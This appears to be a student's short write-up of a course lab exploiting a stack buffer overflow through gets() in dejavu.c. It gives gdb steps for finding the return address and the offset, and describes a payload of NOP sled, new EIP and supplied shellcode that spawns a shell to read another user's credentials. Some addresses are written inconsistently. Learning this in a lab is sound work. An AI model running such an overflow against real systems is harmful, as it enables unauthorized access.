1. Vulnerability: The vulnerable part in the dejavu.c was where you gets(door).
   This allows a hacker to write malicious code in the stdin, allowing them to
   jump to a new location where in our case we spawned a new shell to hack into
   smith. 
   
2. How it could be exploited: We exploited this vulnerability by jumping to a
   new eip, then putting the a new shellcode there which was give to us.
   
3. Walkthrough of our solution: First we used gdb. 
>invoke -d dejavu

(gdb) break deja_vu
(gdb) r 
(gdb) n 
AAAA
(gdb) info frame -->this let us discover the ret address to be over written
which was placed in the 0xbfff75c stack frame.
(gdb) print &door -->this let us discover where the buffer started. Then we
subtract 5c-48 = 20. Which means we need to over write the stack with 20 bytes. 

So our egg python script basically prints a buffer that has
buffer = "\x90 .....(repeat 20 times)" + new_eip(0xbffff75c+4=0xbfff760) + shellcode

Then we call ./exploit and cat README and it should show credentials for user
smith!!!!
